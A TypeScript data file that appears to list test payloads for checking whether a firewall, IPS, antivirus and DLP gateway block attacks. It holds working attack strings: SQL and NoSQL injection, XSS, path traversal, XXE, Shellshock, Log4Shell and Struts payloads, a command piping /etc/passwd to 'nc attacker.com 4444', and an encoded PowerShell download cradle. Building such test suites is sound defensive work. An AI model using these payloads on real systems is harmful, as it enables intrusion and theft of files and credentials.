
import { TestPayload, TestCategory } from './types';

export const TEST_PAYLOADS: TestPayload[] = [
  // --- WAF (Web Application Firewall) ---
  {
    id: 'waf-sqli-01',
    name: 'WAF: SQLi Tautology',
    description: 'Classic auth bypass using "OR 1=1". Tests basic SQL injection signatures.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "' OR 1=1 --",
    expectedBehavior: '403 Forbidden / SQLi Signature Match'
  },
  {
    id: 'waf-sqli-sleep',
    name: 'WAF: Blind SQLi (Time-based)',
    description: 'Attempts to use pg_sleep or SLEEP() functions to detect database response lag.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "'; SELECT pg_sleep(5); --",
    expectedBehavior: 'Time-based SQLi Detection'
  },
  {
    id: 'waf-xss-01',
    name: 'WAF: Reflected XSS',
    description: 'Standard <script> injection. Tests cross-site scripting filters.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "<script>alert('SENTINELA_XSS')</script>",
    expectedBehavior: 'XSS Filter Block'
  },
  {
    id: 'waf-xss-img',
    name: 'WAF: Attribute-based XSS',
    description: 'XSS attempt via onerror attribute in an <img> tag.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "<img src=x onerror=alert(1)>",
    expectedBehavior: 'Attribute-based XSS Detection'
  },
  {
    id: 'waf-rfi-01',
    name: 'WAF: Remote File Inclusion',
    description: 'Attempts to force the server to load a remote script from an external URL.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "http://attacker.com/malicious_shell.txt",
    expectedBehavior: 'RFI/URL Filtering Block'
  },
  {
    id: 'waf-lfi-passwd',
    name: 'WAF: LFI Path Traversal',
    description: 'Attempts to read /etc/passwd using directory traversal sequences.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "../../../../../../../../etc/passwd",
    expectedBehavior: 'LFI / Path Traversal Signature'
  },
  {
    id: 'waf-xxe-01',
    name: 'WAF: XML External Entity (XXE)',
    description: 'Simulates a malicious XML payload attempting to read system files via entities.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
    expectedBehavior: 'XXE Injection Protection'
  },
  {
    id: 'waf-ssti-01',
    name: 'WAF: Template Injection (SSTI)',
    description: 'Attempts to execute code via Jinja2/Mako template syntax.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "{{7*7}} ${7*7} <%= 7*7 %>",
    expectedBehavior: 'SSTI Signature Match'
  },
  {
    id: 'waf-nosqli-01',
    name: 'WAF: NoSQL Injection',
    description: 'Attempts to bypass MongoDB queries using $gt (greater than) operators.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    expectedBehavior: 'NoSQL Operator Filtering'
  },

  // --- IPS (Intrusion Prevention System) ---
  {
    id: 'ips-shellshock',
    name: 'IPS: Shellshock (CVE-2014-6271)',
    description: 'Bash environment variable manipulation exploit signature.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "() { :;}; /bin/bash -c 'whoami'",
    expectedBehavior: 'Shellshock Signature Match'
  },
  {
    id: 'ips-cmd-inj',
    name: 'IPS: Command Injection (Piping)',
    description: 'Attempts to chain system commands using semicolons and pipes.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "; cat /etc/passwd | nc attacker.com 4444",
    expectedBehavior: 'OS Command Injection Detection'
  },
  {
    id: 'ips-log4shell',
    name: 'IPS: Log4Shell (CVE-2021-44228)',
    description: 'Detection of JNDI LDAP lookup patterns used in Log4j exploits.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "${jndi:ldap://attacker.io/a}",
    expectedBehavior: 'Log4J Exploit Block'
  },
  {
    id: 'ips-spring4shell',
    name: 'IPS: Spring4Shell (CVE-2022-22965)',
    description: 'Detection of ClassLoader manipulation patterns in Java Spring applications.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{payload}i",
    expectedBehavior: 'Spring4Shell Signature Block'
  },
  {
    id: 'ips-struts2-rce',
    name: 'IPS: Apache Struts2 RCE',
    description: 'Simulates the OGNL injection pattern used in high-profile Struts exploits.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
    expectedBehavior: 'Struts2 OGNL Injection Signature'
  },
  {
    id: 'ips-php-fpm-rce',
    name: 'IPS: PHP-FPM RCE (CVE-2019-11043)',
    description: 'Detects the specific URL patterns used to exploit PHP-FPM and Nginx.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "index.php?a=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&b=BBBBBBBBBBBBBBBBBB",
    expectedBehavior: 'PHP-FPM Exploit Pattern'
  },

  // --- AV (Anti-Virus / Malware) ---
  {
    id: 'av-eicar-std',
    name: 'AV: EICAR Standard',
    description: 'Standardized non-viral anti-virus test string.',
    category: TestCategory.VIRUS,
    type: 'download',
    targetDevice: 'BOTH',
    content: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    expectedBehavior: 'Gateway AV Block'
  },
  {
    id: 'av-gtube-spam',
    name: 'AV: GTUBE Anti-Spam',
    description: 'Generic Test for Unsolicited Bulk Email (GTUBE) string.',
    category: TestCategory.VIRUS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X",
    expectedBehavior: 'Anti-Spam Filter Match'
  },
  {
    id: 'av-ransom-header',
    name: 'AV: WannaCry Header Mimic',
    description: 'Simulates the file signature (header) of the WannaCry ransomware.',
    category: TestCategory.VIRUS,
    type: 'download',
    targetDevice: 'BOTH',
    content: "WANACRY! [Encrypted Data Simulation Header]",
    expectedBehavior: 'Known Ransomware Signature'
  },
  {
    id: 'av-ps-empire',
    name: 'AV: PowerShell Empire Payload',
    description: 'Detects encoded PowerShell commands used by Empire post-exploitation frameworks.',
    category: TestCategory.VIRUS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "powershell -noP -sta -w 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAgACcAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAGEAJwAgACkAOwA=",
    expectedBehavior: 'Encoded PowerShell Malicious Script'
  },

  // --- DLP (Data Loss Prevention / Exfil) ---
  {
    id: 'dlp-cc-visa',
    name: 'DLP: Credit Card Exfil (Visa)',
    description: 'Attempts to exfiltrate valid-formatted Visa credit card numbers.',
    category: TestCategory.EXFIL,
    type: 'network',
    targetDevice: 'NGFW',
    content: "Customer Records: 4539 1234 5678 9012, 4539 0000 1111 2222",
    expectedBehavior: 'DLP Sensitive Data Filtering (Luhn Match)'
  },
  {
    id: 'dlp-cc-amex',
    name: 'DLP: Credit Card Exfil (Amex)',
    description: 'Attempts to exfiltrate valid-formatted American Express numbers.',
    category: TestCategory.EXFIL,
    type: 'network',
    targetDevice: 'NGFW',
    content: "Amex ID: 3782 822463 10005, 3712 345678 95006",
    expectedBehavior: 'DLP Sensitive Data Filtering'
  },
  {
    id: 'dlp-ssn-leak',
    name: 'DLP: PII/SSN Leak',
    description: 'Detects the exfiltration of Social Security Numbers.',
    category: TestCategory.EXFIL,
    type: 'network',
    targetDevice: 'NGFW',
    content: "Employee List: 000-12-3456, 999-00-1111, 123-45-6789",
    expectedBehavior: 'PII Protection Policy'
  },
  {
    id: 'dlp-aws-key',
    name: 'DLP: AWS Secret Key Exfil',
    description: 'Detects the exfiltration of AWS secret access keys.',
    category: TestCategory.EXFIL,
    type: 'network',
    targetDevice: 'NGFW',
    content: "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    expectedBehavior: 'Secret/Credential Leak Detection'
  },

  // --- API & BOT SECURITY ---
  {
    id: 'api-broken-auth',
    name: 'API: Broken Object Level Auth',
    description: 'Attempts to manipulate API paths to access privileged resources.',
    category: TestCategory.API,
    type: 'network',
    targetDevice: 'NGFW',
    content: "/api/v1/users/admin/export?format=json&force=true",
    expectedBehavior: 'API Access Control / Path Filtering'
  },
  {
    id: 'api-graphql-intro',
    name: 'API: GraphQL Introspection',
    description: 'Attempts to dump the GraphQL schema to discover hidden fields.',
    category: TestCategory.API,
    type: 'network',
    targetDevice: 'NGFW',
    content: "{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}",
    expectedBehavior: 'GraphQL Schema Protection'
  },
  {
    id: 'bot-sqlmap',
    name: 'Bot: SQLMap Discovery',
    description: 'Identifies the signature User-Agent of the sqlmap automated tool.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "User-Agent: sqlmap/1.5.2#stable (http://sqlmap.org)",
    expectedBehavior: 'Bot Detection / Tool Fingerprinting'
  },
  {
    id: 'bot-burp',
    name: 'Bot: Burp Suite Collaborator',
    description: 'Identifies requests attempting to reach Burp Collaborator domains.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "burpcollaborator.net",
    expectedBehavior: 'Known Burp Collaborator Domain Block'
  },

  // --- EVASION TECHNIQUES ---
  {
    id: 'evasion-double-enc',
    name: 'Evasion: Double URL Encoding',
    description: 'Tests if the NGFW decodes multiple layers of URL encoding for LFI.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    expectedBehavior: 'Double Encoding Normalization'
  },
  {
    id: 'evasion-hex-sqli',
    name: 'Evasion: Hex Encoded SQLi',
    description: 'SQLi attempt encoded in hex format to bypass string matching.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "0x27204F5220313D31",
    expectedBehavior: 'Hex Decoding & Inspection'
  },
  {
    id: 'evasion-null-byte',
    name: 'Evasion: Null Byte Injection',
    description: 'Attempts to truncate string checks using null characters (%00).',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "/etc/passwd%00.jpg",
    expectedBehavior: 'Input Sanitization / Null Byte Block'
  }
];
